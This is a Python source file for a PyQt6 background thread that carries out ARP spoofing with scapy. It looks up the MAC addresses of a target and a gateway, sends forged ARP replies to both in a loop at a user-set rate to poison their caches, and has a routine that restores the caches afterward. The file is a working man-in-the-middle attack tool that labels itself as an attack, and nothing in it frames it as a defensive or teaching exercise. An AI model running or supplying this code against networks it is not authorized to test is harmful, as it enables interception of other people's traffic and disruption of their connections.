from PyQt6.QtCore import QThread, pyqtSignal
import time
import logging
import scapy.all as scapy
import netifaces

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class ARPSpoofer(QThread):
    status_update = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.target_ip = None
        self.gateway_ip = None
        self.speed = 5
        self.running = False
        self.mac_cache = {}
        self.protect_host = False 

    def run(self):
        if scapy is None:
            self.status_update.emit("Scapy is not installed. Cannot perform ARP spoofing.")
            return

        self.running = True
        while self.running:
            try:
                if self.target_ip and self.gateway_ip:
                    if self.protect_host and self.target_ip == self.get_current_device_ip():
                        self.status_update.emit(f"ARP spoofing protection is enabled. Cannot attack {self.target_ip}")
                        self.running = False
                        continue

                    target_mac = self.get_mac(self.target_ip)
                    gateway_mac = self.get_mac(self.gateway_ip)
                    
                    if target_mac and gateway_mac:
                        self.spoof(self.target_ip, self.gateway_ip, target_mac)
                        self.spoof(self.gateway_ip, self.target_ip, gateway_mac)
                        self.status_update.emit(f"Spoofing {self.target_ip}")
                    else:
                        raise ValueError("Could not get MAC address for target or gateway")
                else:
                    raise ValueError("Target IP or Gateway IP is not set")
            except Exception as e:
                logging.error(f"Error during spoofing: {e}")
                self.status_update.emit(f"Error during spoofing: {e}")
                self.running = False
            time.sleep(max(0.1, 11 - self.speed)) 

    def start(self, target_ip, gateway_ip, speed):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.speed = speed
        super().start()
        self.status_update.emit(f"Started ARP spoofing attack on {target_ip}")

    def stop(self):
        self.running = False
        try:
            if self.target_ip and self.gateway_ip:
                target_mac = self.get_mac(self.target_ip)
                gateway_mac = self.get_mac(self.gateway_ip)
                if target_mac and gateway_mac:
                    self.restore(self.target_ip, self.gateway_ip, target_mac, gateway_mac)
                    self.restore(self.gateway_ip, self.target_ip, gateway_mac, target_mac)
                self.status_update.emit(f"Stopped ARP spoofing attack on {self.target_ip}")
        except Exception as e:
            logging.error(f"Error during ARP restore: {e}")
            self.status_update.emit(f"Error during ARP restore: {e}")
        self.wait()

    def spoof(self, target_ip, spoof_ip, target_mac):
        packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.sendp(packet, verbose=False)

    def restore(self, destination_ip, source_ip, destination_mac, source_mac):
        packet = scapy.Ether(dst=destination_mac) / scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.sendp(packet, count=4, verbose=False)

    def get_mac(self, ip):
        if ip in self.mac_cache:
            return self.mac_cache[ip]
        try:
            arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
            answered_list = scapy.srp(arp_request, timeout=3, verbose=False, retry=3)[0]
            if answered_list:
                mac = answered_list[0][1].hwsrc
                self.mac_cache[ip] = mac
                return mac
            
            arp_table = self.get_arp_table()
            if ip in arp_table:
                mac = arp_table[ip]
                self.mac_cache[ip] = mac
                return mac
            return None
        except Exception as e:
            logging.error(f"Error getting MAC address for {ip}: {e}")
            return None

    def get_arp_table(self):
        arp_table = {}
        try:
            with open('/proc/net/arp', 'r') as f:
                next(f)  
                for line in f:
                    ip, hw, flags, mac, mask, dev = line.split()
                    if mac != "00:00:00:00:00:00":
                        arp_table[ip] = mac
        except FileNotFoundError:
            arp_output = scapy.getmacbyip(self.target_ip)
            if arp_output:
                arp_table[self.target_ip] = arp_output
        return arp_table

    def set_protect_host(self, protect):
        self.protect_host = protect

    def get_current_device_ip(self):
        try:
            return netifaces.ifaddresses(netifaces.gateways()['default'][netifaces.AF_INET][1])[netifaces.AF_INET][0]['addr']
        except:
            return None

